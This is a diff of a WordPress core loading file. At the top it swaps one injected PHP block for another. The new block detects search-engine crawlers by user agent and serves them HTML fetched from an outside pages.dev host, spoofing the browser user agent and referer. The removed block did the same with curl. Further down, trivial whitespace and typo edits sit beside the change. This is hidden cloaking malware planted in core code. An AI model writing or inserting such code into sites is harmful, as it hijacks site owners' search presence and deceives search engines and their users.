@@ -1,5 +1,28 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://zeushadirdisini.pages.dev/sempakbasah/index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://zeushadirdisini.pages.dev/sempakbasah/index.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+$ctx = stream_context_create([
+"http" => [
+"method" => "GET",
+"header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+"Referer: https://www.google.com/\r\n"
+]
+]);
+return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+usleep(rand(100000, 200000));
+echo stealth($src);
+@ob_end_flush();
+exit;
+}
 /**
  * These functions are needed to load WordPress.
  *
@@ -1145,7 +1168,7 @@ function wp_skip_paused_themes( array $themes ) {
 	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
-		if( array_key_exists( $theme, $paused_themes ) ) {
+		if(array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1459,7 +1482,7 @@ function is_multisite() {
 }
 
 /**
- * Converts a value to non-negative integer.
+ * Convertsa value to non-negative integer.
  *
  * @since 2.5.0
  *
